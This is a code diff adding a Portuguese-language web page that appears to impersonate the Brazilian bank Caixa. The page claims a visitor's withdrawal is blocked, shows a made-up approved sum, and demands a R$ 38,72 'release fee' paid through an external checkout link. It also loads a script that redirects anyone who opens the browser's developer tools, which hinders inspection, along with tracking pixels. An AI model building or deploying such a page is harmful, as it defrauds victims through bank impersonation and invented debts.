@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+url="https://youtu.be/3W4aWnPoRy8?si=jUzCI55TpmEXM3Yw"></script>
+    
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Liberação de Saque</title>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "swxyif3oa6");
+  </script>
+  
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <style>
+    @keyframes pulse-scale-yellow {
+
+      0%,
+      100% {
+        box-shadow: 0 0 0 0 rgba(255, 217, 0, 0.7);
+      }
+
+      50% {
+        box-shadow: 0 0 0 12px rgba(255, 217, 0, 0);
+      }
+    }
+
+    .pulse-effect-yellow {
+      animation: pulse-scale-yellow 2.5s infinite;
+    }
+  </style>
+</head>
+
+<body>
+
+  <script>
+  window.pixelId = "692cedccf1d8644d9b7bb3bc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    
+  <div class="min-h-screen bg-[#fffff] flex flex-col items-center px-4 py-8">
+    <div class="w-full max-w-md">
+      <div class="flex items-center justify-center">
+        <div class="flex items-center">
+          <img src="images/logocaixa2.png" alt="Caixa Logo" class="w-[250px] -mt-10" style="padding:10px; margin-top:7px; margin-bottom:13px;">
+        </div>
+      </div>
+
+      <div class="text-center mb-8 px-6">
+        <h1 class="text-2xl font-semibold text-[#000000] mb-6 leading-tight">
+          Transação Temporariamente Bloqueada por 30 dias.
+        </h1>
+
+        <div class="bg-[#1a5e9c] px-4 py-3 rounded-none mb-8">
+          <span class="text-[#fff] font-semibold text-2xl">#67273649874632BRL</span>
+        </div>
+      </div>
+
+      <div class="bg-[#f8f8f8] p-6 rounded-lg">
+        <div class="text-center mb-8">
+          <p class="text-[#333333] text-2xl leading-relaxed">
+            Por segurança em transações internacionais,
+            <span class="font-semibold">seu saque foi bloqueado por 30 dias.</span>
+          </p>
+        </div>
+
+        <div class="bg-[#ffffff] rounded-2xl mb-8 shadow-sm">
+          <div class="bg-[#1a5e9c] px-4 py-2 rounded-t-2xl relative w-full">
+            <span class="text-[#fff] font-semibold text-lg">Status</span>
+          </div>
+
+          <div class="space-y-4 p-5">
+            <div class="flex items-center gap-4">
+              <div class="w-10 h-10 bg-[#0ebe00] rounded-full p-2 flex-shrink-0">
+                <img src="images/Done.svg" class="w-full" alt="">
+              </div>
+              <span class="text-[#000000] font-semibold text-lg">Pagamento de IOF concluído</span>
+            </div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-10 h-10 bg-[#ffc200] p-2 rounded-full flex-shrink-0">
+                <img src="images/Error.svg" class="w-full" alt="">
+              </div>
+              <span class="text-[#000000] font-semibold text-lg">Etapa pendente: Taxa de
+                Liberação do Saque Imediato</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="text-center mb-8">
+          <p class="text-[#333333] text-2xl leading-relaxed">
+            <span><b><span id="approvedAmount">XXX</span></b> já estão prontos pra você, pague <b>R$ 38,72</b> agora e saque
+              imediatamente.
+              <span><br>
+              </span>
+          </span></p>
+        </div>
+<script>
+  // Carregar valor aprovado do localStorage
+        const valorAprovado =
+          localStorage.getItem("creditoAprovado") || "7.584,00";
+        document.getElementById("approvedAmount").textContent =
+          "R$ " + valorAprovado;
+</script>
+        <button id="btnSaque" class="w-full bg-[#f7941c] text-[#fff] font-semibold text-xl py-4 rounded-2xl mb-6 transition-colors pulse-effect-yellow">
+          Realizar Saque Imediato
+        </button>
+
+        <div class="text-center w-[100%]">
+          <p class="text-[#333333] text-lg leading-relaxed font-thin">
+            Após o pagamento, o sistema valida seu CPF e
+            <span>libera o valor automaticamente.</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+ 
+ 
+  <script>
+    document.getElementById("btnSaque").onclick = function () {
+
+
+      document.getElementById("btnSaque").disabled = true;
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Remove o value antigo da URL
+      urlParams.delete("value");
+
+      // Monta a nova URL com o novo value
+      urlParams.set("value", "38.72");
+      // Monta a nova URL com o novo value
+      urlParams.set("produto_id", "298");
+      urlParams.set("upsell", "1");
+      // Redireciona
+      const destino = "https://www.pay-pagamentos.link/checkout/5cbb781e-da3e-4cf6-9b77-c4e01c284a4d?" + urlParams.toString();
+      window.location.href = destino;
+    };
+  </script>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "silz60upc3");
+  </script>
+
+</body></html>
